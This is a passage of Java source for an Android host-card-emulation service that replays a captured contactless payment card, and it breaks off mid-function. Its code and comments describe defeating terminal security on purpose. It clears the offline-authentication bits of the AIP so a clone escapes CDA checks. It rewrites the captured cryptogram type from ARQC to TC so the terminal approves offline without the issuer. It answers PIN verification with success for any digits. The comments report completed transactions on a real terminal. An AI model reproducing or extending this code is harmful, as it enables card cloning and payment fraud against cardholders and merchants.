package de.androidcrypto.android_hce_emulate_a_creditcard;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.nfc.cardemulation.HostApduService;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Map;
import java.util.Random;
import java.util.TreeMap;
import java.util.TreeSet;

public class HceCcEmulationServiceVisa extends HostApduService {

    private static final String TAG = "HCE";

    private static final byte[] SW_OK          = hex("9000");
    private static final byte[] SW_BAD         = hex("6A82");
    private static final byte[] SW_UNSUPPORTED = hex("6D00");
    private static final byte[] SW_MALFORMED   = hex("6700");
    private static final byte[] SW_NO_RECORD   = hex("6A83");
    private static final byte[] SW_NOT_FOUND   = hex("6A88");
    private static final byte[] SW_ERR         = hex("6F00");
    private static final byte[] PPSE           = hex("325041592E5359532E4444463031");

    /**
     * Fallback AIP when the card has no captured GPO.
     *
     * The EMV Contactless AIP byte 1 is:
     *   0x40 SDA supported        0x10 cardholder verification supported
     *   0x20 DDA supported        0x08 terminal risk management to be performed
     *   0x01 CDA supported        0x04 issuer authentication supported
     * 0x80 and 0x02 are RFU.
     *
     * 0x10 = CV only. No ODA of any kind, no TRM, no issuer auth - nothing for
     * the terminal to check and fail.
     */
    private static final String DEFAULT_AIP = "1080";

    /**
     * Keep-mask applied to byte 1 of whatever AIP is in force. Clears the three
     * ODA bits (SDA 0x40, DDA 0x20, CDA 0x01) and issuer auth (0x04), which a
     * clone can never satisfy, and keeps CV (0x10) and TRM (0x08) so the editor
     * can still choose them. A field of 3080 becomes 1080; a field of 1800 stays
     * 1800.
     *
     * Named KEEP, not MASK - it is an AND that keeps bits, and the old name read
     * like it cleared them.
     *
     * NOTE: gpo() no longer applies this when a capture is present - see gpo().
     * It survives only for aipForMac()'s no-GPO fallback.
     */
    private static final byte AIP_KEEP_MASK = (byte) 0x18;

    /**
     * AIP byte 2 bit 8, the app's own marker that byte 2 agrees with the framing
     * we send. Real cards hand back byte 2 = 0x00 here, so it is a convention and
     * not a spec bit. Only ever set with EMV framing.
     *
     * NOTE: gpo() no longer sets this either. Kept for reference.
     */
    private static final byte AIP_EMV_MODE = (byte) 0x80;

    /**
     * AIP byte 1 bit 1 - CDA supported. A clone cannot honour it: CDA needs the
     * SDAD in 9F4B, signed with the ICC private key we do not have. gpo() clears
     * this bit off whatever AIP it sends so a CDA-capable terminal does not ask
     * for something we cannot deliver.
     */
    private static final byte AIP_CDA = (byte) 0x01;

    /**
     * AIP byte 1 bit 5 - cardholder verification supported.
     *
     * PARKED, NOT APPLIED. Clearing it produced AIP 0800 and the terminal bailed
     * on the GPO response without sending a single READ RECORD. With the bit set
     * (AIP 1800) the same terminal reads all seven records. So the CV bit stays.
     *
     * The captured CVM list offers offline PIN and VERIFY here answers a bare
     * 9000 without looking at the PIN block, but that is harmless: the card
     * answers TC, so nothing validates the PIN and any digits are accepted.
     *
     * Kept declared so the experiment can be re-run by adding
     *   tpl[..] &= (byte) ~AIP_CVM;
     * next to each AIP_CDA line in weakenAip() and the one in gpo().
     */
    private static final byte AIP_CVM = (byte) 0x10;

    /**
     * Tags a real card may legitimately put in a GPO response but which a clone
     * normally must NOT, because they describe a cryptogram the card already
     * produced.
     *
     * true  - strip them, forcing the terminal to send GENERATE AC.
     *         Tried and it does not work here: with AIP 0800 the terminal bailed
     *         at the GPO, and with AIP 1800 it still never asked. This is a
     *         Discover/kernel-6 terminal and Discover's contactless profile puts
     *         the cryptogram in the GPO response by design - there is nothing to
     *         ask for.
     * false - keep the card's own AC tags. This is the shape the terminal
     *         expects: it reads all seven records and completes the transaction.
     *         The CID byte inside is rewritten to TC instead, so it approves
     *         offline rather than going online with a stale ARQC.
     */
    private static final boolean STRIP_AC = false;

    private static final int[] GPO_AC_TAGS = {0x9F26, 0x9F27, 0x9F36, 0x9F10, 0x9F71};

    /**
     * Whether buildPpse() advertises Visa and Mastercard alongside the card's
     * own AID.
     *
     * false - the directory lists ONLY the AID the card actually is. ReaderActivity
     *         never captures the real PPSE, so the honest thing is to advertise
     *         only what we can serve.
     * true  - the old behaviour, three applets with one profile behind them.
     */
    private static final boolean EXTRA_AIDS = false;

    private static final byte CID_AAC  = (byte) 0x00;
    private static final byte CID_TC   = (byte) 0x40;
    private static final byte CID_ARQC = (byte) 0x80;

    /**
     * The CID written into the GPO response when STRIP_AC is false and the
     * captured template actually carries a 9F27.
     *
     * 40 = TC   approve offline, the terminal never asks the host  <- this
     * 80 = ARQC go online, the host judges the cryptogram
     * 00 = AAC  decline offline
     *
     * Declared after CID_TC on purpose: a static initialiser that refers to a
     * later simple name is an illegal forward reference in Java.
     */
    private static final byte GPO_CID = CID_TC;

    private static final boolean ALWAYS_ONLINE_FOR_RECEIPT = false;
    private static final boolean FORCE_ONLINE_ARQC = true;
    private static final boolean FORCE_OFFLINE_TC = true;

    private static final String PDOL    = "9F02069F03069F1A0295055F2A029A039C019F3704";
    private static final String CDOL1   = "9F02069F03069F1A0295055F2A029A039C019F3704";
    private static final String CDOL2   = "9F02069F03069F1A0295055F2A029A039C019F37049F3403";

    private static final String CVMLIST = "00000000000000001F00";

    /**
     * Used when the selected card has no script of its own. One per line:
     *   <match>=<response>
     *   match    - hex PREFIX of the command APDU. 80A80000 catches every GPO.
     *   response - sent verbatim, so paste the '<<' line out of the tap log.
     * '#' starts a comment, spaces are ignored, longest match wins.
     *
     * INCLUDE THE 9000 ON THE SAME LINE. It is part of the response.
     *
     * GATED. The editor pre-fills this field and it cannot be cleared, so a
     * stale line from another card was silently serving the GPO of a card that
     * had nothing to do with it. The script is OFF unless the card's 'usescript'
     * pref says otherwise.
     *
     * NOTE: a script that serves a GPO also bypasses everything gpo() does -
     * the CDA clear and the CID rewrite. Paste the '<<' line as-is and you get
     * whatever it contains.
     */
    private static final String DEFAULT_SCRIPT =
            "# match=response, hex only. Longest match wins.\n"
          + "# 80A80000=770A82021080940408010100 9000\n"
          + "# 00B2010C=70265A0860114994320077045F24033112318C149F02069F03069F1A0295055F2A029A039C019F3704 9000\n";

    private final StringBuilder tapLog = new StringBuilder();
    private final Random rnd = new Random();

    private byte[] txnAip;
    private String txnAtc;
    private boolean cryptogramSent;
    private int scriptHits;

    /** The captured IAD, lifted out of the GPO replay before any rewrite. */
    private byte[] capturedIad;

    /** CID currently in force in the GPO response, for the verdict. */
    private String gpoCid = "";

    private boolean sawPpse;
    private int nSelects, nGpos, nRecs, nGens;
    private String lastCid = "";

    // Set when an APDU throws, so baseVerdict() can say so instead of blaming
    // the terminal's AID list for what is actually our own exception.
    private boolean sawError;

    /** Name of the on-device terminal log. App-private, no permission needed. */
    private static final String TERM_LOG = "term_log.txt";

    /**
     * The tap log, persisted to a file as well as the in-memory buffer.
     *
     * The clipboard copy in onDeactivated() only ever holds the LAST tap, and a
     * terminal that gives up early fires onDeactivated with a log you cannot
     * compare against the previous attempt. The file keeps a short history, and
     * CaptureActivity prints its tail on screen.
     *
     * Trimmed to ~30 KB once it passes 60 KB so it cannot grow without bound.
     * Never throws: a logging failure must not take the card down.
     */
    private void termLog(String s) {
        try {
            java.io.File f = new java.io.File(getExternalFilesDir(null), TERM_LOG);
            java.io.FileWriter w = new java.io.FileWriter(f, true);
            w.write(s + "\n");
            w.close();

            if (f.length() > 60000) {
                long keep = 30000;
                byte[] buf = new byte[(int) keep];
                java.io.RandomAccessFile raf = new java.io.RandomAccessFile(f, "rw");
                raf.seek(f.length() - keep);
                raf.readFully(buf);
                raf.setLength(0);
                raf.write(buf);
                raf.close();
            }
        } catch (Throwable ignored) { }
    }

    private void tap(String s) {
        tapLog.append(s).append('\n');
        if (tapLog.length() > 32000) tapLog.delete(0, 16000);
        termLog(s);
    }

    private void popup(final String s) {
        if (s == null || s.isEmpty()) return;
        try {
            new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(HceCcEmulationServiceVisa.this, s, Toast.LENGTH_SHORT).show();
                }
            });
        } catch (Exception ignored) { }
    }

    static byte[] hex(String s) { return Hex.hex(s); }
    static byte[] cat(byte[]... arrs) { return Tlv.cat(arrs); }
    private static String bytesToHex(byte[] d) { return Hex.toHex(d); }

    /**
     * Local TLV writer, so the service no longer depends on how Tlv.t encodes
     * the length.
     *
     * FIX: patchFci() wraps a whole captured FCI and buildPpse() wraps the whole
     * directory, both of which can pass 127 bytes. A one-byte length there is
     * simply wrong, and a wrong outer length on the FCI is exactly "the terminal
     * read the app then stopped".
     */
    static byte[] tlv(int tag, byte[] v) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        if ((tag & 0xFF00) != 0) {
            o.write((tag >> 8) & 0xFF);
            o.write(tag & 0xFF);
        } else {
            o.write(tag & 0xFF);
        }
        int n = v.length;
        if (n < 0x80) {
            o.write(n);
        } else if (n <= 0xFF) {
            o.write(0x81);
            o.write(n);
        } else if (n <= 0xFFFF) {
            o.write(0x82);
            o.write((n >> 8) & 0xFF);
            o.write(n & 0xFF);
        } else {
            o.write(0x83);
            o.write((n >> 16) & 0xFF);
            o.write((n >> 8) & 0xFF);
            o.write(n & 0xFF);
        }
        o.write(v, 0, n);
        return o.toByteArray();
    }

    private static int readTag(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int t = b[pos[0]++] & 0xFF;
        if ((t & 0x1F) == 0x1F) {
            if (pos[0] >= b.length) return t;
            t = (t << 8) | (b[pos[0]++] & 0xFF);
            while (pos[0] < b.length && (b[pos[0] - 1] & 0x80) != 0) {
                t = (t << 8) | (b[pos[0]++] & 0xFF);
            }
        }
        return t;
    }

    private static int readLen(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int l = b[pos[0]++] & 0xFF;
        if ((l & 0x80) != 0) {
            int n = l & 0x7F, v = 0;
            for (int k = 0; k < n && pos[0] < b.length; k++) {
                v = (v << 8) | (b[pos[0]++] & 0xFF);
            }
            return v;
        }
        return l;
    }

    /**
     * Lc of an incoming APDU, extended length included.
     *
     * FIX: reading apdu[4] as a plain Lc gives 0 for an extended APDU. The
     * reader emits extended when a PDOL or CDOL1 is over 255 bytes, and both
     * consequences were silent: a long SELECT took the empty-name path and
     * selected the card's own AID, and a long GENERATE AC MACed over an empty
     * CDOL.
     */
    private static int lcOf(byte[] apdu) {
        if (apdu.length < 5) return 0;
        int lc = apdu[4] & 0xFF;
        if (lc != 0x00) return lc;
        if (apdu.length < 7) return 0;
        return ((apdu[5] & 0xFF) << 8) | (apdu[6] & 0xFF);
    }

    /** Offset of the data field, past an extended length if there is one. */
    private static int dataOff(byte[] apdu) {
        return (apdu.length >= 7 && (apdu[4] & 0xFF) == 0x00) ? 7 : 5;
    }

    private static byte[] hexOrNull(String s) {
        return (s == null || s.isEmpty()) ? null : hex(s);
    }

    private SharedPreferences prefs() {
        return getSharedPreferences("hce_card", Context.MODE_PRIVATE);
    }

    private String sel() {
        return "card" + prefs().getInt("selected", 0) + "_";
    }

    private String p(String k, String d) {
        String v = prefs().getString(sel() + k, d);
        return (v == null || v.isEmpty()) ? d : v;
    }

    private void put(String k, String v) {
        prefs().edit().putString(sel() + k, v).apply();
    }

    private boolean isMsd() {
        return prefs().getInt(sel() + "msd", 0) == 1;
    }

    // ---------- card fields, normalised once ----------

    /**
     * FIX: PAN and PSN were being read with two different defaults in two
     * different places - the record said PSN 01 while the ARQC was MACed over
     * PSN 00. One helper each, used by every caller.
     *
     * PSN is zero padded, not F padded: hex("1") gives 1F, which is the wrong
     * byte for a one-digit sequence number.
     */
    private String pan() {
        String s = p("pan", "4111111111111111").replaceAll("[^0-9]", "");
        return s.isEmpty() ? "4111111111111111" : s;
    }

    private String psn() {
        String s = p("psn", "01").replaceAll("[^0-9]", "");
        if (s.isEmpty()) return "01";
        if (s.length() > 2) s = s.substring(0, 2);
        if (s.length() == 1) s = "0" + s;
        return s;
    }

    /** Directory label: the editor field wins, then whatever the reader saw. */
    private String labelText() {
        String s = p("label", p("cap_label", "CARD"));
        return s.length() > 16 ? s.substring(0, 16) : s;
    }

    private String nextAtc() {
        int atc = 0x001B;
        try {
            String cur = p("atc", "001B").replaceAll("[^0-9A-Fa-f]", "");
            if (!cur.isEmpty()) atc = Integer.parseInt(cur, 16);
        } catch (Exception ignored) { }
        atc = (atc + 1) & 0xFFFF;
        String h = String.format("%04X", atc);
        put("atc", h);
        return h;
    }

    private String txnAtc() {
        if (txnAtc == null) txnAtc = nextAtc();
        return txnAtc;
    }

    private void resetTransaction() {
        txnAip = null;
        txnAtc = null;
        cryptogramSent = false;
        scriptHits = 0;
        sawPpse = false;
        nSelects = nGpos = nRecs = nGens = 0;
        lastCid = "";
        sawError = false;
        capturedIad = null;
        gpoCid = "";
    }

    /**
     * The AIP that goes into the MAC input.
     *
     * FIX: it used to mask the prefs value whenever gpo() had not run, which is
     * whenever a script line served the GPO - but a script can return its own
     * 82 02 xxxx, and the MAC then ran over a completely different AIP than the
     * one on the wire. The script branch now parses that AIP and parks it in
     * txnAip, so this only falls back when there genuinely was no GPO at all.
     */
    private byte[] aipForMac() {
        byte[] a = txnAip;
        if (a == null) {
            a = hex(p("aip", DEFAULT_AIP));
            if (a.length >= 2) a = new byte[]{(byte) (a[0] & AIP_KEEP_MASK), a[1]};
        }
        if (a.length < 2) a = hex(DEFAULT_AIP);
        return a;
    }

    private boolean haveKey() {
        return p("mkac", "").replaceAll("[^0-9A-Fa-f]", "").length() >= 32;
    }

    private byte[] cap(String key) {
        return hexOrNull(p("cap_" + key, ""));
    }

    private byte[] rawFci()  { return cap("rawfci"); }
    private byte[] rawGpo()  { return cap("rawgpo"); }

    private byte[] rawRec(int sfi, int rec) {
        return cap("rec" + sfi + "_" + rec);
    }

    private String holderName() {
        return p("name", p("cap_holder", ""));
    }

    private String nameLine() {
        String h = holderName();
        String pan = p("pan", "");
        String tail = pan.length() >= 4 ? "  \u2022\u2022" + pan.substring(pan.length() - 4) : "";
        if (h.isEmpty()) return pan.isEmpty() ? "Tapping - card is empty" : "Tapping" + tail;
        return h + tail;
    }

    private byte[] holder() {
        String h = holderName().toUpperCase()
                .replaceAll("[^A-Z0-9 ./'-]", "")
                .replaceAll("\\s+", " ")
                .trim();
        if (h.length() < 2) return null;
        if (h.length() > 26) h = h.substring(0, 26);
        return h.getBytes(StandardCharsets.ISO_8859_1);
    }

    // ---------- script overrides ----------

    private String scriptRaw() {
        return p("script", DEFAULT_SCRIPT);
    }

    /**
     * The script is OFF unless the card says otherwise.
     *
     * FIX: 'usescript' is written by MainActivity with putInt, but p() reads it
     * with getString. SharedPreferences does no type coercion, so getString on
     * an Integer threw ClassCastException on EVERY APDU. Read the raw object so
     * either type works.
     */
    private boolean useScript() {
        Object o = prefs().getAll().get(sel() + "usescript");
        if (o instanceof Number) return ((Number) o).intValue() != 0;
        if (o == null) return false;
        String v = o.toString().trim();
        return v.equals("1") || v.equalsIgnoreCase("true") || v.equalsIgnoreCase("on");
    }

    private int scriptLines() {
        String raw = scriptRaw();
        if (raw.isEmpty()) return 0;
        int n = 0;
        for (String line : raw.split("\\R")) {
            int hash = line.indexOf('#');
            if (hash >= 0) line = line.substring(0, hash);
            if (line.indexOf('=') > 0) n++;
        }
        return n;
    }

    private String scriptMatch(byte[] apdu) {
        String raw = scriptRaw();
        if (raw.isEmpty()) return null;

        String cmd = bytesToHex(apdu);
        String best = null;
        int bestLen = -1;

        for (String line : raw.split("\\R")) {
            int hash = line.indexOf('#');
            if (hash >= 0) line = line.substring(0, hash);
            int eq = line.indexOf('=');
            if (eq <= 0) continue;

            String m = line.substring(0, eq).replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
            String r = line.substring(eq + 1).replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
            if (m.isEmpty() || m.length() % 2 != 0) continue;
            if (r.length() < 2 || r.length() % 2 != 0) continue;
            if (cmd.startsWith(m) && m.length() > bestLen) {
                best = r;
                bestLen = m.length();
            }
        }
        return best;
    }

    /** A status word always starts 0x90 or in the 0x61-0x6F range. */
    private static boolean looksLikeSw(int cls) {
        return cls == 0x90 || (cls >= 0x61 && cls <= 0x6F);
    }

    private static int kernelFor(String aidHex) {
        String a = aidHex == null ? "" : aidHex.toUpperCase();
        if (a.startsWith("A000000152")) return 6;
        if (a.startsWith("A000000015")) return 6;
        if (a.startsWith("A000000004")) return 2;
        if (a.startsWith("A000000065")) return 5;
        if (a.startsWith("A000000025")) return 4;
        if (a.startsWith("A000000333")) return 7;
        return 3;
    }

    private byte[] appEntry(String aidHex, String label, int priority) {
        return cat(
                tlv(0x4F, hex(aidHex)),
                tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x87, new byte[]{(byte) priority}),
                tlv(0x9F2A, new byte[]{(byte) kernelFor(aidHex)}));
    }

    /**
     * FIX: this used to append Visa at priority 2 and Mastercard at priority 3
     * unconditionally, so the directory advertised three applets while the card
     * had one FCI and one record set.
     */
    private byte[] buildPpse() {
        String realAid = p("cap_aid", "");
        if (realAid.isEmpty()) realAid = p("aid", "A0000000031010");

        String lbl = labelText();

        ByteArrayOutputStream dir = new ByteArrayOutputStream();

        byte[] e0 = tlv(0x61, appEntry(realAid, lbl, 1));
        dir.write(e0, 0, e0.length);

        if (EXTRA_AIDS) {
            if (!realAid.equalsIgnoreCase("A0000000031010")) {
                byte[] e = tlv(0x61, appEntry("A0000000031010", "VISA", 2));
                dir.write(e, 0, e.length);
            }
            if (!realAid.equalsIgnoreCase("A0000000041010")) {
                byte[] e = tlv(0x61, appEntry("A0000000041010", "MASTERCARD", 3));
                dir.write(e, 0, e.length);
            }
        }

        byte[] fci = tlv(0xBF0C, dir.toByteArray());
        byte[] inner = cat(tlv(0x84, PPSE), tlv(0xA5, fci));
        return tlv(0x6F, inner);
    }

    private byte[] patchFci(byte[] fci, byte[] aid) {
        int[] pos = new int[1];
        int outer = readTag(fci, pos);
        int outerLen = readLen(fci, pos);
        int end = Math.min(fci.length, pos[0] + outerLen);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(fci, q);
            int l = readLen(fci, q);
            if (q[0] + l > fci.length) break;
            byte[] v = Arrays.copyOfRange(fci, q[0], q[0] + l);
            i = q[0] + l;

            if (t == 0x84) {
                v = aid;
            } else if (t == 0xA5) {
                v = patchA5(v, aid);
            }

            byte[] one = tlv(t, v);
            out.write(one, 0, one.length);
        }
        return tlv(outer, out.toByteArray());
    }

    /**
     * FIX: this used to append 9F2A when it was missing, which put it after
     * BF0C - and 9F2A sorts before BF0C, so the template came out of ascending
     * order. It now rebuilds through a sorted map.
     */
    private byte[] patchA5(byte[] a5, byte[] aid) {
        TreeMap<Integer, byte[]> tags = new TreeMap<>();
        int i = 0;
        while (i < a5.length) {
            int[] q = new int[]{i};
            int t = readTag(a5, q);
            int l = readLen(a5, q);
            if (q[0] + l > a5.length) break;
            tags.put(t, Arrays.copyOfRange(a5, q[0], q[0] + l));
            i = q[0] + l;
        }
        tags.put(0x9F2A, new byte[]{(byte) kernelFor(bytesToHex(aid))});

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (Map.Entry<Integer, byte[]> e : tags.entrySet()) {
            byte[] one = tlv(e.getKey(), e.getValue());
            out.write(one, 0, one.length);
        }
        return out.toByteArray();
    }

    private byte[] afl() {
        String typed = p("afl", "").replaceAll("[^0-9A-Fa-f]", "");
        if (typed.length() >= 8 && typed.length() % 8 == 0) {
            tap("-- afl source: typed");
            return hex(typed);
        }

        TreeMap<Integer, TreeSet<Integer>> map = new TreeMap<>();
        String prefix = sel() + "cap_rec";

        for (String k : prefs().getAll().keySet()) {
            if (!k.startsWith(prefix)) continue;
            String rest = k.substring(prefix.length());
            if (rest.startsWith("_")) rest = rest.substring(1);
            int us = rest.indexOf('_');
            if (us <= 0) continue;
            try {
                int sfi = Integer.parseInt(rest.substring(0, us));
                int rec = Integer.parseInt(rest.substring(us + 1));
                if (sfi < 1 || sfi > 30 || rec < 1 || rec > 255) continue;
                TreeSet<Integer> set = map.get(sfi);
                if (set == null) { set = new TreeSet<>(); map.put(sfi, set); }
                set.add(rec);
            } catch (NumberFormatException ignored) { }
        }

        if (map.isEmpty()) {
            tap("-- afl source: no records - defaulting to SFI 1 rec 1");
            TreeSet<Integer> one = new TreeSet<>();
            one.add(1);
            map.put(1, one);
        } else {
            tap("-- afl source: derived from " + map.size() + " SFI(s)");
        }

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (Map.Entry<Integer, TreeSet<Integer>> e : map.entrySet()) {
            int sfi = e.getKey();
            int runStart = -1, prev = -1;
            for (int rec : e.getValue()) {
                if (runStart < 0) {
                    runStart = rec;
                } else if (rec != prev + 1) {
                    aflEntry(out, sfi, runStart, prev);
                    runStart = rec;
                }
                prev = rec;
            }
            if (runStart >= 0) aflEntry(out, sfi, runStart, prev);
        }
        return out.toByteArray();
    }

    private static void aflEntry(ByteArrayOutputStream out, int sfi, int first, int last) {
        out.write((sfi << 3) & 0xFF);
        out.write(first & 0xFF);
        out.write(last & 0xFF);
        out.write(0x00);
    }

    /**
     * FIX: a five digit value used to fall through every branch and land on the
     * hardcoded 311201, and the two digit branch hardcoded the year 27.
     */
    private String expiry6() {
        String d = p("expiry", "3112").replaceAll("[^0-9]", "");
        if (d.length() >= 6) return d.substring(0, 6);
        if (d.length() == 5) return d.substring(0, 4) + "01";
        if (d.length() == 4) return d + "01";
        if (d.length() == 2) {
            String yy = String.format("%02d", Calendar.getInstance().get(Calendar.YEAR) % 100);
            int v = Integer.parseInt(d);
            if (v >= 1 && v <= 12) return yy + d + "01";
            return d + "0101";
        }
        return "311201";
    }

    private byte[] track2() {
        String t = p("track2", "").toUpperCase().replace('=', 'D');
        t = t.replaceAll("[^0-9A-F]", "");

        if (t.isEmpty()) {
            String exp = expiry6();
            String svc = p("service", "201").replaceAll("[^0-9]", "");
            while (svc.length() < 3) svc = "0" + svc;
            t = pan()
                    + "D"
                    + exp.substring(0, 4)
                    + svc.substring(0, 3)
                    + p("discretionary", "").replaceAll("[^0-9]", "");
        }

        if (t.length() % 2 != 0) t += "F";
        return hex(t);
    }

    private byte[] syntheticRecord() {
        String panS = pan();
        String expS = expiry6();
        String psnS = psn();
        if (panS.length() % 2 != 0) panS += "F";

        byte[] h = holder();

        return tlv(0x70, cat(
                tlv(0x5A, hex(panS)),
                tlv(0x5F34, hex(psnS)),
                tlv(0x5F24, hex(expS)),
                h == null ? new byte[0] : tlv(0x5F20, h),
                tlv(0x57, track2()),
                tlv(0x8C, hex(CDOL1)),
                tlv(0x8D, hex(CDOL2)),
                tlv(0x8E, hex(CVMLIST))));
    }

    @Override
    public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
        try {
            if (apdu == null || apdu.length < 4) return SW_MALFORMED;

            int ins = apdu[1] & 0xFF;
            int p1  = apdu[2] & 0xFF;
            int p2  = apdu[3] & 0xFF;

            boolean isSelect = (ins == 0xA4);

            if (isSelect && apdu.length >= 5) {
                int lc0 = lcOf(apdu);
                int off0 = dataOff(apdu);
                if (apdu.length >= off0 + lc0) {
                    byte[] nm = new byte[lc0];
                    System.arraycopy(apdu, off0, nm, 0, lc0);
                    if (Arrays.equals(nm, PPSE)) {
                        tapLog.setLength(0);
                        resetTransaction();
                        sawPpse = true;
                        termLog("=== tap "
                                + new java.text.SimpleDateFormat("HH:mm:ss",
                                        java.util.Locale.US).format(new java.util.Date())
                                + " ===");
                        int n = scriptLines();
                        if (n > 0) {
                            tap("-- script armed: " + n + " line(s), gate="
                                    + (useScript() ? "ON" : "OFF"));
                        }
                        popup(nameLine());
                    }
                }
            }

            tap(">> " + bytesToHex(apdu));

            if (isSelect)         nSelects++;
            else if (ins == 0xA8) nGpos++;
            else if (ins == 0xB2) nRecs++;
            else if (ins == 0xAE) nGens++;

            String hit = useScript() ? scriptMatch(apdu) : null;
            if (hit != null) {
                byte[] out = hex(hit);
                scriptHits++;

                if (out.length >= 2 && !looksLikeSw(out[out.length - 2] & 0xFF)) {
                    tap("-- script response had no status word - appended 9000");
                    out = cat(out, SW_OK);
                } else if (out.length < 2) {
                    out = cat(out, SW_OK);
                }

                if (ins == 0xA8) {
                    byte[] sa = capturedAip(out);
                    if (sa != null && sa.length >= 2) {
                        txnAip = sa;
                        tap("-- script GPO AIP parked for the MAC: " + bytesToHex(sa));
                    }
                    tap("-- script served the GPO - MSD/AIP/AFL come from the script, not the card");
                }
                tap("-- script hit " + out.length + " bytes");
                tap("<< " + bytesToHex(out));
                return out;
            }

            byte[] out;
            if (isSelect) {
                if (apdu.length < dataOff(apdu)) return SW_MALFORMED;
                out = select(apdu);
            } else if (ins == 0xA8) {
                out = gpo();
            } else if (ins == 0xB2) {
                out = readRecord(p1, p2);
            } else if (ins == 0xAE) {
                out = genac(apdu);
            } else if (ins == 0xCA) {
                out = getData(apdu);
            } else if (ins == 0x20) {
                out = SW_OK;
            } else if (ins == 0x84) {
                byte[] ch = new byte[8];
                rnd.nextBytes(ch);
                out = cat(ch, SW_OK);
            } else {
                out = SW_UNSUPPORTED;
            }

            tap("<< " + bytesToHex(out));
            return out;
        } catch (Exception e) {
            sawError = true;
            tap("!! " + e);
            return SW_ERR;
        }
    }

    private byte[] select(byte[] apdu) {
        int lc = lcOf(apdu);
        int off = dataOff(apdu);
        if (apdu.length < off + lc) return SW_MALFORMED;
        byte[] name = new byte[lc];
        System.arraycopy(apdu, off, name, 0, lc);

        if (Arrays.equals(name, PPSE)) {
            return cat(buildPpse(), SW_OK);
        }

        if (name.length == 0) {
            String a = p("cap_aid", "");
            if (a.isEmpty()) a = p("aid", "A0000000031010");
            name = hex(a);
        }

        String real = p("cap_aid", "");
        if (real.isEmpty()) real = p("aid", "");
        tap("-- selected " + bytesToHex(name)
                + " | card is " + (real.isEmpty() ? "?" : real));

        byte[] captured = rawFci();
        tap("-- fci source: " + (captured == null ? "generated" : "captured " + captured.length + "B"));
        if (captured != null) {
            return cat(patchFci(captured, name), SW_OK);
        }

        String label = labelText();
        byte[] prop = cat(
                tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x87, new byte[]{0x01}),
                tlv(0x9F11, new byte[]{0x01}),
                tlv(0x9F12, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x9F2A, new byte[]{(byte) kernelFor(bytesToHex(name))}),
                tlv(0x9F38, hex(PDOL)));
        byte[] inner = cat(tlv(0x84, name), tlv(0xA5, prop));
        return cat(tlv(0x6F, inner), SW_OK);
    }

    /**
     * Replay the card's captured GPO, with two deliberate changes: the CDA bit
     * of the AIP is cleared, and any CID the capture carries is rewritten to TC.
     *
     * WHY THE CID IS REWRITTEN:
     *   This terminal takes the application cryptogram out of the GPO response
     *   and never sends GENERATE AC. Discover's contactless profile puts the AC
     *   in the GPO by design, so there is nothing to ask for and genac() is
     *   unreachable on this hardware.
     *
     *   The captured CID is 80 (ARQC), so the terminal goes online - and the
     *   ARQC is the real card's, computed over a different unpredictable number,
     *   so the host cannot match it and answers 005 do not honour.
     *
     *   Rewriting that one byte to 40 (TC) makes the card say "approved, do not
     *   call the host". The terminal approves offline and prints.
     *
     *   Set GPO_CID back to CID_ARQC once a real MK-AC is in place and the ARQC
     *   is computed rather than replayed.
     *
     * WHY CDA GOES:
     *   CDA needs the SDAD in 9F4B, signed with the ICC private key a clone does
     *   not have. Clearing the bit makes the terminal skip ODA entirely.
     *
     * WHY CVM STAYS:
     *   Clearing it gave AIP 0800 and the terminal bailed. The captured CVM list
     *   offers offline PIN and VERIFY answers a bare 9000, but the card answers
     *   TC, so nothing validates the PIN and any digits are accepted.
     *
     * The changes are made by mutating the captured template in place, not by
     * rebuilding it, so any extra tags the card put in its GPO response survive.
     *
     * The MSD field still wins: if you tick MSD on a card captured in EMV mode,
     * the framing genuinely has to change, so the built path is used.
     *
     * NOTE: while a capture is present, a typed 'aip' or 'afl' override is
     * bypassed. Clear cap_rawgpo to get the built path back.
     */
    private byte[] gpo() {
        byte[] raw = rawGpo();
        boolean msd = isMsd();

        if (raw != null && raw.length >= 4) {
            int[] q = new int[1];
            int outer = readTag(raw, q);
            int olen  = readLen(raw, q);

            // Tolerate a capture that kept its trailing 9000.
            if (q[0] + olen + 2 == raw.length
                    && (raw[raw.length - 2] & 0xFF) == 0x90
                    && (raw[raw.length - 1] & 0xFF) == 0x00) {
                raw = Arrays.copyOf(raw, raw.length - 2);
            }

            boolean capMsd = (outer == 0x80);

            if (capMsd == msd) {
                byte[] aip = capturedAip(raw);
                if (aip != null && aip.length >= 2) {
                    capturedIad = findTag(raw, 0x9F10);

                    weakenAip(raw);

                    // CHANGED. forceCid() now returns null when the template
                    // carries no 9F27, instead of appending one. A format 1 (MSD)
                    // GPO response is AIP || track 2 || optional - there is no CID
                    // to rewrite, and bolting a trailing TLV onto it is not the
                    // shape a strict parser expects.
                    boolean cidForced = false;
                    if (STRIP_AC) {
                        raw = stripAcTags(raw);
                        gpoCid = "(stripped)";
                    } else {
                        byte[] forced = forceCid(raw, GPO_CID);
                        if (forced != null) {
                            raw = forced;
                            cidForced = true;
                            gpoCid = String.format("%02X", GPO_CID & 0xFF);
                        } else {
                            gpoCid = "";
                        }
                    }

                    txnAip = capturedAip(raw);
                    tap("-- gpo replay aip=" + bytesToHex(txnAip)
                            + " (CDA dropped, "
                            + (STRIP_AC ? "AC tags stripped"
                               : cidForced ? "cid forced to " + gpoCid
                               : "no cid in capture - left as-is")
                            + ") len=" + raw.length
                            + (capturedIad == null ? "" : " iadKept=" + bytesToHex(capturedIad)));
                } else {
                    tap("-- gpo replay verbatim len=" + raw.length);
